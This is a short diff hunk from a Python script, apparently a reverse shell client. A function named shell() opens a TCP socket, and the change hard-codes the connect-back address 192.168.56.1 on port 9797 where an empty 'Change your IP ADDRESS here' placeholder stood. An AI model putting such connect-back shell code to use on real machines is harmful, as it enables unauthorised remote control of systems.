@@ -96,5 +96,5 @@ def shell():
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 msg = "Hello!!"
 IP_ADDRESS = '' #Change your IP ADDRESS here
-s.connect((IP_ADDRESS, 9797)) 
+s.connect(('192.168.56.1', 9797)) 
 shell()
